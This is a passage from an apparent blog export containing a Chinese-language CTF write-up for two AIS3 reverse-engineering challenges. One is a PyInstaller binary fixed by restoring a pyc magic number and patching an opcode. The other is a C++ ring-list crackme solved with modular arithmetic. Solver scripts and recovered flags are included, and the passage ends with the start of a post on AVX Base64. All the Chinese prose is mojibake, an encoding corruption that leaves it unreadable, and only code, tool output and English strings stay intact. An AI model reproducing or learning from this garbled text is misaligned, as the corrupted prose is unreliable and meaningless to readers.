ä½ç§»æ•…æ„å¯«éŒ¯è¦ä¿®ï¼Œæˆ–åœŸç‚®åŠ å¯†å¯«éŒ¯ä¹‹é¡çš„é¡Œç›®ï¼Œå¤§æ¦‚æœ‰å€‹å…©ä¸‰é¡Œï¼Œä½†è¦ºå¾—å‡ºåœ¨é€™è£¡å¥½åƒä¸å¤ªå¥½æœ€å¾Œç”¢äº†ä¸€é¡Œå¤§ä¾¿é¡ŒğŸ¤”ï¸ ğŸŒ¹ La vie en roseé¡Œç›®æ•˜è¿° é¡Œè§£ç¨å¾®é€†å‘çœ‹ä¸€ä¸‹æœƒç™¼ç¾ binary å‰é¢ä¸€ç›´ä½¿ç”¨ _MEIPASS2 é€™å€‹å­—ä¸²ï¼Œæœƒè¢«æ‹¿å» call GetEnvironmentVariableW ä¹‹é¡çš„ APIï¼ŒæŸ¥ä¸€ä¸‹å°±å¯ä»¥ç™¼ç¾é€™å€‹æ˜¯ PyInstaller ä½¿ç”¨çš„ä¸€å€‹ç’°å¢ƒè®Šæ•¸ï¼ŒPyInstaller æ˜¯ä¸€å€‹å¯ä»¥æŠŠ python åŒ…æˆåŸ·è¡Œæª”çš„å·¥å…·ï¼ˆexeä»¥å¤–ä¹Ÿå¯ä»¥ï¼‰ï¼ŒåŸç†æ˜¯æŠŠ python compile æˆ bytecode ä¹‹å¾Œï¼ŒåŸ·è¡Œæª”åŸ·è¡Œæ™‚æœƒæŠŠ bytecode æŠ“å‡ºä¾†åŸ·è¡Œï¼Œä¸é›£æƒ³åˆ°æ‡‰è©²æœƒæœ‰å·¥å…·å¯ä»¥æŠŠæ±è¥¿æ‹‰å‡ºä¾†ï¼ŒPyInstaller Extractorã€‚ æ‰€æœ‰çš„æ±è¥¿æœƒè¢«æŠ½å‡ºä¾†æ”¾é€² La vie en rose.exe_extracted è³‡æ–™å¤¾ï¼Œpyinstallerextractor.py æœƒå‘Šè¨´ä½  entry point æ˜¯å•¥ï¼š pyinstxtractor.py:86: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#x27;s documentation for alternative uses import imp[*] Processing La vie en rose.exe[*] Pyinstaller version: 2.1+[*] Python version: 38[*] Length of package: 9518557 bytes[*] Found 955 files in CArchive[*] Beginning extraction...please standby[+] Possible entry point: pyiboot01_bootstrap[+] Possible entry point: pyi_rth__tkinter[+] Possible entry point: pyi_rth_multiprocessing[+] Possible entry point: rose[*] Found 258 files in PYZ archive[*] Successfully extracted pyinstaller archive: La vie en rose.exe ä½†å¦‚æœå®ƒçµ¦éŒ¯ï¼Œä¹Ÿå¯ä»¥ç”¨ grep æ‰¾åˆ°ï¼Œå› ç‚º python bytecode çš„å­—ä¸²æ˜¯ raw dataï¼š $ grep outland *grep: PYZ-00.pyz_extracted: Is a directoryBinary file rose matches æ‰€ä»¥æˆ‘å€‘æ¥ä¸‹ä¾†è¦åšçš„äº‹æƒ…æ˜¯ decompile rose.pycï¼Œé€™è£¡å¯ä»¥ç”¨ uncompyle6 ä¾†åšï¼Œä½†æ˜¯æœƒæœ‰éŒ¯èª¤è¨Šæ¯ï¼ŒåŸå› æ˜¯ pyc å°‘äº†ç‰ˆæœ¬ magic numberï¼Œå¾ˆå¥½ç†è§£ï¼Œå› ç‚º PyInstaller çŸ¥é“è‡ªå·±åœ¨é€™å€‹ binary ç”¨äº†ä»€éº¼ç‰ˆæœ¬ï¼Œæ‰€ä»¥ä»–å¯ä»¥æŠŠ magic number æ‹”æ‰ä¾†ç¯€çœç©ºé–“ï¼š uncompyle6 rose.pycTraceback (most recent call last): File &quot;/usr/local/lib/python3.7/site-packages/xdis/load.py&quot;, line 168, in load_module_from_file_object float_version = magic_int2float(magic_int) File &quot;/usr/local/lib/python3.7/site-packages/xdis/magics.py&quot;, line 399, in magic_int2float return py_str2float(magicint2version[magic_int])KeyError: 227During handling of the above exception, another exception occurred:Traceback (most recent call last): File &quot;/usr/local/bin/uncompyle6&quot;, line 8, in &lt;module&gt; sys.exit(main_bin()) File &quot;/usr/local/lib/python3.7/site-packages/uncompyle6/bin/uncompile.py&quot;, line 194, in main_bin **options) File &quot;/usr/local/lib/python3.7/site-packages/uncompyle6/main.py&quot;, line 326, in main do_fragments, File &quot;/usr/local/lib/python3.7/site-packages/uncompyle6/main.py&quot;, line 186, in decompile_file filename, code_objects File &quot;/usr/local/lib/python3.7/site-packages/xdis/load.py&quot;, line 141, in load_module get_code=get_code, File &quot;/usr/local/lib/python3.7/site-packages/xdis/load.py&quot;, line 176, in load_module_from_file_object % (ord(magic[0:1]) + 256 * ord(magic[1:2]), filename)ImportError: Unknown magic number 227 in rose.pyc ä½†æ˜¯å…¶å¯¦ python import æ±è¥¿çš„æ™‚å€™æ˜¯æœƒæª¢æŸ¥ magic number çš„ï¼Œæ‰€ä»¥ extract å‡ºä¾†çš„ library æ‡‰è©²éƒ½é‚„ç•™è‘— magic numberï¼š $ xxd importlib.pyc | head00000000: 550d 0d0a 0000 0000 0000 0000 e300 0000 U...............00000010: 0000 0000 0000 0000 0000 0000 0008 0000 ................ æ‰€ä»¥å…¶å¯¦ä¹Ÿä¸éœ€è¦çŸ¥é“ç‰ˆæœ¬ï¼Œ å¯ä»¥ç›´æ¥æ‹¿åˆ° magic number 550d 0d0aã€‚å‡è¨­ä¸çŸ¥é“é€™ä»¶äº‹æƒ…çš„è©±ï¼Œé‚£ç¾åœ¨è¦å…ˆçŸ¥é“ç‰ˆæœ¬æ˜¯ä»€éº¼ï¼Œè¦ç¢ºå®šç‰ˆæœ¬æœ‰å¹¾å€‹æ–¹æ³•ï¼ŒåŸ·è¡Œ binary å»çœ‹ä»–è¼‰äº†ä»€éº¼ dllï¼š æˆ–æ˜¯åƒå‰›å‰›ä¸€æ¨£ç›´æ¥ grepï¼Œä¸ç„¶ ls ä¹Ÿè¡Œï¼š $ grep python *Include\\pyconfig.h:# pragma comment(lib,&quot;python38_d.lib&quot;)Include\\pyconfig.h:# pragma comment(lib,&quot;python3.lib&quot;)Include\\pyconfig.h:# pragma comment(lib,&quot;python38.lib&quot;)$ ls | grep python python38.dll çŸ¥é“ç‰ˆæœ¬å¾Œï¼Œå¯ä»¥åœ¨ cpython github æ‰¾åˆ° magic numberï¼š _bootstrap_external.py261262263264265266267268# Python 3.8a1 3400 (move frame block handling to compiler #17611)# Python 3.8a1 3401 (add END_ASYNC_FOR #33041)# Python 3.8a1 3410 (PEP570 Python Positional-Only Parameters #36540)# Python 3.8b2 3411 (Reverse evaluation order of key: value in dict# comprehensions #35224)# Python 3.8b2 3412 (Swap the position of positional args and positional# only args in ast.arguments #37593)# Python 3.8b4 3413 (Fix &quot;break&quot; and &quot;continue&quot; in &quot;finally&quot; #37830) ç¸½ä¹‹é€™è£¡å¯ä»¥ç›´æ¥æŠŠ importlib.pyc 550d 0d0a è£œåˆ° rose.pyc å‰é¢å°±å¥½äº†ï¼Œä½†é‚„è¦å¦å¤–è£œä¸Š 12 byteï¼Œé€™æ¨£ marshal åç§»åˆ° 0x10 æ‰æœƒå°ï¼Œå…¶ä¸­åŒ…æ‹¬ timestamp è·Ÿ source sizeï¼Œä¸æ˜¯å¾ˆé‡è¦æ‰€ä»¥å°±éš¨ä¾¿æŠ“ä¸€æŠ“ä¹Ÿä¸Ÿé€²å»å°±å¥½äº†ï¼š head -c 16 PYZ-00.pyz_extracted/importlib.pyc | cat - rose.pyc &gt; rose_ok.pyc ç„¶å¾Œè©¦è©¦çœ‹ decompile æœƒé‡åˆ° bytecode éŒ¯èª¤ï¼š $ uncompyle6 rose_ok.pyc...Parse error at or near `JUMP_FORWARD&#x27; instruction at offset 222 å•é¡Œå‡ºåœ¨ 222 JUMP_FORWARD æƒ³è¦è·³å» 256 JUMP_BACK 182 &#39;to 182&#39; ä½† uncompyle6 å‡ºäº†é»å•é¡Œï¼Œæˆ‘å€‘å¯ä»¥å˜—è©¦æŠŠ JUMP_FORWARD 256 ç›´æ¥æ›¿æ›æˆ JUMP_BACK 182ï¼š L. 35 220 JUMP_BACK 182 &#x27;to 182&#x27; 222 JUMP_FORWARD 256 &#x27;to 256&#x27; # this line 224_0 COME_FROM 218 &#x27;218&#x27;L. 37 224 LOAD_NAME winsound 226 LOAD_METHOD Beep 228 LOAD_NAME floor 230 LOAD_NAME keytone 232 LOAD_NAME note 234 LOAD_CONST 0 236 BINARY_SUBSCR 238 BINARY_SUBSCR 240 CALL_FUNCTION_1 1 &#x27;&#x27; 242 LOAD_CONST 200 244 LOAD_NAME note 246 LOAD_CONST 1 248 BINARY_SUBSCR 250 BINARY_MULTIPLY 252 CALL_METHOD_2 2 &#x27;&#x27; 254 POP_TOP 256_0 COME_FROM 222 &#x27;222&#x27; 256_1 COME_FROM 206 &#x27;206&#x27; 256 JUMP_BACK 182 &#x27;to 182&#x27; è¦ä¿®æ”¹ä»–æˆ‘å€‘è¦å…ˆæ‰¾åˆ°JUMP_FORWARD çš„ opcode æ˜¯ä»€éº¼ import disprint(hex(dis.opname.index(&#x27;JUMP_FORWARD&#x27;)))#0x6e marshal opcode é–‹å§‹çš„åœ°æ–¹åœ¨ 0x2eï¼Œæ‰€ä»¥ç²¾æº–è¦ä¿®æ”¹çš„ä½ç½®æ˜¯ $0x2e + 222 &#x3D; 0x10c$ï¼Œ 222 çš„æ—é‚Š 220 JUMP_BACK 182 &#39;to 182&#39; æ­£å¥½æ˜¯æˆ‘å€‘è¦çš„æ“ä½œï¼Œå¯ä»¥ç›´æ¥è¤‡è£½è²¼ä¸Šï¼š 00000100: 6400 1900 640b 6b02 72e0 71b6 6e20 6500 d...d.k.r.q.n e.#ä¿®æ”¹æˆ00000100: 6400 1900 640b 6b02 72e0 71b6 71b6 6500 d...d.k.r.q.n e. ç„¶å¾Œå°±å¯ä»¥ decompile äº†ï¼š uncompyle6 rose_ok.pyc &gt; rose.py ç›´æ¥ç”¨è¨»è§£ä¾†è§£é‡‹åœ¨å¹¹å˜›ï¼š rose.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# uncompyle6 version 3.7.1# Python bytecode 3.8 (3413)# Decompiled from: Python 3.8.0 (default, Oct 28 2019, 16:14:01) # [GCC 8.3.0]# Embedded file name: rose.py# Size of source mod 2**32: 227 bytesimport winsoundfrom time import sleepfrom math import floor#### é€™è£¡å–®ç´”åœ¨ç®—ç´éµéŸ³é«˜ ####keytone = &#123;&#x27;a&#x27;: 261.63&#125;pt = keytone[&#x27;a&#x27;]for k in (&#x27;w&#x27;, &#x27;s&#x27;, &#x27;e&#x27;, &#x27;d&#x27;, &#x27;f&#x27;, &#x27;t&#x27;, &#x27;g&#x27;, &#x27;y&#x27;, &#x27;h&#x27;, &#x27;u&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;o&#x27;, &#x27;l&#x27;, &#x27;p&#x27;, &#x27;;&#x27;, &quot;&#x27;&quot;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27; &#x27;): keytone[k] = pt * pow(2, 0.08333333333333333) pt = keytone[k]print(&#x27;Play some music to please me, despicable outlander....&#x27;)print(&quot;\\n ________________________________________________________\\n| | | | | | | | | | | | | | | | | | | | | | | | |\\n| | | | | | | | | | | | | | | | | | | | | | | | |\\n| |w| |e| | |t| |y| |u| | |o| |p| | |[| | | | | |\\n| |_| |_| | |_| |_| |_| | |_| |_| | |_| |_| |_| |\\n| | | | | | | | | | | | | | |\\n| a | s | d | f | g | h | j | k | l | ; | &#x27; | ] | | |\\n|___|___|___|___|___|___|___|___|___|___|___|___|___|___|\\n&quot;)notes = input()play = [[&#x27;-&#x27;, 1]]for note in notes: if note == play[(-1)][0]: play[(-1)][1] += 1 else: play.append([note, 1])#### ç©ºç™½æ˜¯ä¼‘æ­¢ç¬¦ï¼Œ- ç”¨ä¾†æŠŠéŸ³ç¬¦åˆ†æˆå…©çµ„ hh-hh æ˜¯å…©å€‹4åˆ†éŸ³ç¬¦ hhhh æ˜¯ä¸€å€‹2åˆ†éŸ³ç¬¦ ####for note in play: if note[0] == &#x27; &#x27;: sleep(0.2) elif note[0] == &#x27;-&#x27;: continue else: winsound.Beep(floor(keytone[note[0]]), 200 * note[1]) # ç™¼å‡ºè²éŸ³result = []notes = list(map(ord, notes))#### å…ˆæŠŠå…©å€‹ç›¸é„°çš„éŸ³ç¬¦ç›¸åŠ çš„å€¼æ”¾é€² result ####for i in range(len(notes) - 1): result.append(notes[i] + notes[(i + 1)])#### å…ˆæŠŠå…©å€‹ç›¸é„°çš„éŸ³ç¬¦ç›¸æ¸›çš„å€¼æ”¾é€² result ####for i in range(len(notes) - 1): result.append(notes[i] - notes[(i + 1)])#### result è¦ç­‰æ–¼ constraintï¼Œè¡¨ç¤ºè¼¸å…¥çš„ notes å°±æ˜¯ keyï¼Œä¾†æ‹¿ xor secret æœƒå°å‡º flagï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç¹éï¼Œå¿…é ˆè¦çŸ¥é“ notes æ˜¯ä»€éº¼ ####constraint = [..ç•¥..]if result == constraint: secret = [..ç•¥..] flag = &#x27;&#x27;.join(map(chr, [secret[i] ^ notes[(i % len(notes))] for i in range(len(secret))])) print(&#x27;That sounds good... I like to write the lyric for it&#x27;) print(flag)else: print(&#x27;I said music, that sounds like diarrhea&#x27;)input()# okay decompiling rose_ok.pyc çœ‹åˆ°é€™è£¡ä¸é›£ç™¼ç¾å…¶å¯¦å°±æ˜¯åœ¨è§£è¯ç«‹æ–¹ç¨‹å¼ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œconstraint[0] æ˜¯ notes[0]+notes[1] è·Ÿ constraint[120] æ˜¯ notes[0]-notes[1] çš„å€¼ï¼Œæœ‰å”¯ä¸€è§£ï¼Œè€Œä¸”æˆ‘å€‘çŸ¥é“æ¨‚è­œæ‡‰è©²æœ‰ 121 å€‹ noteï¼Œå› ç‚º len(constraint)=240ï¼š solve_note.py1234567891011121314151617#!/usr/bin/env python3constraint = [216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 217, 212, 210, 208, 210, 212, 210, 208, 136, 140, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 202, 150, 167, 219, 219, 216, 219, 222, 219, 216, 219, 222, 219, 216, 219, 222, 217, 217, 219, 167, 150, 182, 199, 216, 219, 222, 219, 216, 212, 208, 208, 208, 149, 149, 210, 217, 219, 167, 150, 182, 199, 216, 219, 222, 219, 216, 211, 206, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 5, 0, 2, 0, -2, 0, 2, 0, 72, -76, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 20, 32, -49, -3, 3, 0, -3, 0, 3, 0, -3, 0, 3, 0, -3, 0, 5, -5, 3, 49, -32, 0, -17, 0, -3, 0, 3, 0, 4, 0, 0, 0, 59, -59, -2, -5, 3, 49, -32, 0, -17, 0, -3, 0, 3, 0, 5, 0]length = len(constraint)//2notes = [ (constraint[i]+constraint[length+i])//2 for i in range(length)] + [notes[-1]-constraint[-1]]# bytes(notes) = b&#x27;lloolloolloo[;lolloolloolloo[;lolloolloolloo[;lolloojjhhjjhh lloolloolloo[;lolloolloolloojol;[[lloollhhhh-hjol;[[lloollg&#x27;secret = [62, 9, 11, 79, 0, 5, 4, 10, 76, 30, 0, 28, 62, 72, 76, 9, 5, 0, 3, 28, 76, 1, 22, 79, 8, 30, 10, 14, 54, 72, 102, 46, 2, 8, 79, 13, 30, 5, 1, 8, 31, 76, 2, 10, 123, 79, 3, 79, 24, 4, 10, 79, 26, 6, 9, 11, 15, 74, 17, 7, 85, 76, 30, 10, 28, 24, 102, 56, 7, 5, 24, 10, 79, 50, 72, 76, 12, 3, 0, 11, 79, 13, 2, 11, 79, 13, 0, 24, 14, 19, 28, 76, 66, 62, 58, 30, 2, 6, 1, 11, 102, 42, 29, 26, 12, 72, 6, 15, 11, 76, 89, 34, 123, 13, 76, 29, 0, 21, 13, 11, 71, 24, 9, 28, 27, 102, 46, 3, 14, 15, 7, 79, 27, 51, 94, 76, 13, 9, 13, 28, 27, 76, 8, 10, 28, 15, 9, 1, 11, 40, 27, 10, 29, 3, 1, 79, 28, 4, 13, 11, 0, 27, 31, 101, 54, 62, 87, 0, 0, 27, 76, 13, 10, 11, 31, 28, 17, 74, 8, 29, 26, 78, 31, 102, 40, 0, 0, 8, 101, 14, 2, 8, 79, 45, 15, 108, 76, 9, 76, 0, 79, 14, 76, 11, 79, 6, 76, 31, 79, 46, 74, 38, 76, 104, 123, 104, 76, 23, 27, 7, 93, 31, 55, 14, 4, 92, 74, 55, 24, 10, 8, 100, 55, 50, 7, 95, 48, 29, 3, 31, 84, 20, 51, 10, 94, 3, 0, 31, 48, 27, 13, 93, 24, 14, 53, 70]flag = &#x27;&#x27;.join(map(chr,[ secret[i]^notes[i%len(notes)] for i in range(len(secret))]))print(flag)#Red like roses fills my dreams#And brings me to the place you rest#White is cold and always yearning#Burdened by a royal test#Black the beast descends from shadows#Yellow beauty burns#Gold#and BTW f l a g i s A I S 3 &#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125; Flag: AIS3&#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125; ä»¥é˜²è¬ä¸€ä½ æƒ³çŸ¥é“é€™ç´è­œæ˜¯é‚£é¦–ï¼š ğŸ‰ Uroborosé¡Œç›®æ•˜è¿° ä½ å¥½å•Šæ„›å¾·è¯å¤§å“¥å“¥ï¼ŒçœŸçš„æ²’æƒ³åˆ°ä½ å¯ä»¥åˆ°ç¬¬äºŒåäº”å±¤ä¾†å‘¢ï¼ä¸éå°±åˆ°é€™è£¡ç‚ºæ­¢äº†ï¼Œæ¥ä¸‹ä¾†å°±ç”±æˆ‘ åé‡åŠ›ä¸‰é ­é–éˆåº·å¦®Â·è§£æ”¾Â·ç·‹ç´… ä¾†åšä½ çš„å°æ‰‹! å‡ºé€™é¡Œæ‰ç™¼ç¾ï¼Œé€™å€‹ emoji ä¹Ÿå¤ªå¸¥äº†ã„…ï¼Œå…ƒæ°£å½ˆï¼Ÿï¼Ÿï¼Ÿ ç„¶å¾Œå¯« blog æ‰ç™¼ç¾ï¼Œæˆ‘ cout å­—ä¸²çš„åœ°æ–¹è¿´åœˆå¯«éŒ¯äº†ğŸ¤”ï¸ï¼Œå°‘å°ä¸€å€‹æ‹‰ï¼Œå“ˆå“ˆï¼Œä¸éå‰›å¥½æ²’è¼¸å…¥è¸©åˆ°é‚£å€‹é»ï¼Œç¬‘åˆ°ä¸è¡Œã€‚ é¡Œè§£æœ‰ä½¿ç”¨ structure çš„ C++ é€†å‘é¡Œï¼Œä»”ç´°çœ‹å¯ä»¥ç™¼ç¾ï¼Œä¸€é–‹å§‹åšäº†ä¸€å€‹ circular double linked listï¼Œæ•´å€‹ç’°çš„é•·åº¦æ˜¯ 314ï¼ŒåŸæœ¬çš„ code çœ‹èµ·ä¾†åƒæ˜¯é€™æ¨£ï¼š source.c1516171819202122232425262728node* ring = new node;ring-&gt;prev = ring;ring-&gt;next = ring;ring-&gt;idx = 0;node* work = ring;for(int i = 0 ; i &lt; 313 ; i ++)&#123; node* temp = new node; temp-&gt;idx = 0; temp-&gt;next = work-&gt;next; temp-&gt;prev = work; work-&gt;next = temp; work = temp;&#125; ç•«å‡ºä¾†é•·é€™æ¨£ï¼š stateDiagramdot:&quot;...&quot;[*] --&gt; node0node0 --&gt; node1node1 --&gt; node2node2 --&gt; dotdot --&gt; node313node313 --&gt; node0 decompile å¾Œ C++ é•·å¾—æ¯”è¼ƒé›£çœ‹æ‡‚ä¸€é»ï¼Œå¤§è‡´æ˜¯é€™æ¨£ï¼š // cout &lt;&lt; &quot;Only state alchemists are entitled to know the forbidden secret, show me that you are&quot; &lt;&lt; endl;// å¦‚æœä½ å° c++ æœ‰é»èªè­˜çš„è©± cout å…¶å¯¦æœƒå›å‚³ ostreamï¼Œæ‰€ä»¥ v3 æ˜¯ç”¨ä¾†ç¹¼çºŒä¸² endl ç”¨çš„v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout,&quot;Only state alchemists are entitled to know the forbidden secret, show me that you are&quot;);std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);// string v19;std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v19);// cin &gt;&gt; v19;std::operator&gt;&gt;&lt;char&gt;(&amp;std::cin, v19);// std::string::iterator v13 = v19.begin();v13 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(v19);// std::string::iterator v14 = v19.end()v14 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(v19);// while v13 != v14 é€™å€‹è¿´åœˆæœƒæŠŠè¼¸å…¥çš„æ¯å€‹å­—éƒ½æ‹¿å‡ºä¾†while ( (unsigned __int8)__gnu_cxx::operator!=&lt;jstmt_t **,std::vector&lt;jstmt_t *&gt;&gt;(&amp;v13, &amp;v14) ) &#123; // v12 = *v13; æ‹¿å‡ºç•¶å‰çš„ char v12 = *(char *)sub_21E6((__int64)&amp;v13); v15 = v16; // åœ¨ç’°ä¸Šæ‰¾åˆ°ç¬¬ char*7 å€‹ nodeï¼Œ for ( j = 0; j &lt; 7 * v12; ++j ) v15 = v15-&gt;next; // æŠŠè‡ªå·±çš„å€¼è¨˜éŒ„ä¸Šå»ï¼Œä½†æŠŠåŸæœ¬çš„å€¼ &lt;&lt; 6 ä¾†ä¿ç•™é‡è¤‡çš„å­— v15-&gt;value = v9++ + (v15-&gt;value &lt;&lt; 6); // v13++; sub_21C6(&amp;v13); &#125; å­¸é™¢æ´¾è§£æ³• (?)æ‰€ä»¥ input çš„æ¯å€‹å­—æœƒæŒ‰ç…§é †åºè¢«æ¨™è¨˜åœ¨ç’°ä¸Šï¼Œå…¶å¯¦å°±æ˜¯å–æ¨¡çš„æ¦‚å¿µï¼Œå‡è¨­è¼¸å…¥Aï¼Œå°±æœƒåœ¨ç’°ä¸Šé¢èµ° ord(&#39;A&#39;)*7 = 65*7 = 455 æ­¥ï¼Œä½†æ˜¯å› ç‚ºåªæœ‰ 314 å€‹é»ï¼ˆ0~313ï¼‰æ‰€ä»¥æˆ‘å€‘æœƒèµ°åˆ° 141 è™Ÿ nodeï¼š $$65*7=455 \\\\ 455\\%314=141$$ åˆå› ç‚º 7 è·Ÿ 314 äº’è³ªï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ç›´æ¥åšé€†é‹ç®—å¾—åˆ°æ¯ä¸€å€‹ä½ç½®æ˜¯ä»€éº¼ï¼Œä¾‹å¦‚å‰›å‰›çš„Aæˆ‘å€‘å¯ä»¥å¾ 141 é€†æ¨ï¼š $$?*7\\equiv 141\\mod 314\\\\?\\equiv 141*7^{-1}\\mod 314\\\\141*45\\mod314\\\\\\text{(7 åœ¨ mod 314 ä¸‹çš„æ¨¡åå…ƒç´ æ˜¯ 45 å¯ä»¥åƒè€ƒ exgcd)}\\\\25418\\equiv65\\mod314$$ æ¨å‡ºåŸæœ¬çš„å­—æ˜¯chr(65)=&#39;A&#39;ï¼Œç…§é€™æ¨£å°±å¯ä»¥å¯«è…³æœ¬äº†ï¼š solve.py12345678910target = &quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 511847092 0 0 0 0 0 0 48 0 0 0 0 0 0 0 40984114273074 0 0 0 0 0 280 0 0 0 0 0 0 26022 26 0 0 0 0 0 0 2035 0 0 0 0 0 0 15 0 0 0 0 0 0 53 0 0 0 0 0 0 47 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 42350 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 0 0 0 0 0 29201 0 0 0 0 0 0 805 0 0 0 0 0 1 939 0 0 0 0 0 0 13 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 7739889 0 0 0 0 0 0 1251 0 0 0 0 0 0 45 0 0 0 0 0 0 2950300 0 0 0 0 0 2 23 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 0 0 0 0 0 0 0 0 0 0 5 0 0 0 0 0 0 0 0 0 0 0 0 0 55 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0&quot;.split(&#x27; &#x27;)flag = [&#x27;&#x27;]*100for number,value in enumerate(map(int,target)): while value : idx = value&amp;0b111111 #åªæ‹¿æœ€ä½6ä½ï¼Œå› ç‚º Uroboros æ¯æ¬¡åŠ æ–°çš„å€¼æœƒ &lt;&lt; 6 flag[idx] = chr((number*45)%314) value = value &gt;&gt; 6print(&#x27;&#x27;.join(flag)) Flag: AIS3&#123;4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy&#125; ä½†ä¹Ÿå¯ä»¥æŠŠæ¯å€‹ printable éƒ½å…ˆ *7%314 å°±å¯ä»¥çŸ¥é“å°æ‡‰çš„å€¼äº†æ‹‰ é‡ç¸æµè§£æ³• (?)æœ¬ä¾†æ²’æœ‰å°ä½¿ç”¨è€…è¼¸å…¥æ‰€ç”¢ç”Ÿçš„ç’°é•·æ€æ¨£ï¼Œä½†è¦ºå¾—é€™æ¨£ debug é›£åº¦å¥½åƒæœ‰é»èºå‡ï¼Œæ‰€ä»¥æœ€å¾Œé‚„æ˜¯å°å‡ºä¾†äº†ï¼Œæ‰€ä»¥é€™è£¡å°±æœ‰å¦å¤–ä¸€å€‹è§£æ³•ï¼ˆæˆ‘å¥½åƒæ²’çœ‹åˆ°æœ‰äººé€™æ¨£è§£ï¼‰ï¼Œå°±æ˜¯å¯ä»¥å…ˆé»‘ç®±æ¸¬è©¦çŸ¥é“è¼¸å…¥æ˜¯æ€éº¼æ¨£å‘ˆç¾åœ¨ç’°ä¸Šé¢çš„ï¼Œä¹‹å¾Œå°±å¯ä»¥é€²è¡Œ byte by byte çˆ†ç ´ï¼Œæ‹¿ä¾†è·Ÿæ­£è§£æ¯”æ¯”çœ‹å°±çŸ¥é“ç•¶å‰é€™ä¸€ byte å°ä¸å°äº†ã€‚","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]},{"title":"TIL::AVX Base64","slug":"TIL-AVX-Base64","date":"2020-01-27T15:39:12.000Z","updated":"2020-01-27T16:46:48.000Z","comments":true,"path":"tw/TIL-AVX-Base64/","permalink":"http://blog.terrynini.tw/tw/TIL-AVX-Base64/","excerpt":"é›–ç„¶ä¸æ˜¯ TIL äº†ï¼Œç¸½ä¹‹åœ¨è§£ flare-on 2019 çš„æ™‚å€™ä¹Ÿæœ‰é‡åˆ°ä¸€é¡ŒåŒ…è£æˆ vm é¡Œçš„ AVX é‹ç®—çš„ base64ï¼Œç•¶åˆæ²’æœ‰ç™¼ç¾ç›´æ¥ç•¶ä½œåŠ å¯†æµç¨‹é€†è‘—ç®—ï¼Œçœ‹åˆ° flag æ‰çŸ¥é“æ˜¯ base64 â€¦.","text":"é›–ç„¶ä¸æ˜¯ TIL äº†ï¼Œç¸½ä¹‹åœ¨è§£ flare-on 2019 çš„æ™‚å€™ä¹Ÿæœ‰é‡åˆ°ä¸€é¡ŒåŒ…è£æˆ vm é¡Œçš„ AVX é‹ç®—çš„ base64ï¼Œç•¶åˆæ²’æœ‰ç™¼ç¾ç›´æ¥ç•¶ä½œåŠ å¯†æµç¨‹é€†è‘—ç®—ï¼Œçœ‹åˆ° flag æ‰çŸ¥é“æ˜¯ base64 â€¦. é€é AVX2 è®“å¤§é‡é‹ç®—å¯ä»¥åŒæ™‚åŸ·è¡Œï¼ŒåŠ é€Ÿåˆ°å¹¾ä¹è·Ÿ memcpy ä¸€æ¨£å¿«ï¼ŒåŸå§‹çš„ paper åŠ github ï¼Œ å¦å¤–é‚„æœ‰é€éå…¶ä»–ç¨® SIMD çš„é‹ç®—ï¼ˆAVX2, AVX512F, AVX512BW â€¦ç­‰ç­‰ï¼‰ä¾†åŠ é€Ÿçš„åšæ³• githubã€‚","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"Base64","slug":"Base64","permalink":"http://blog.terrynini.tw/tags/Base64/"},{"name":"AVX","slug":"AVX","permalink":"http://blog.terrynini.tw/tags/AVX/"}]},{"title":"ç¨‹å¼å®‰å…¨::HW4 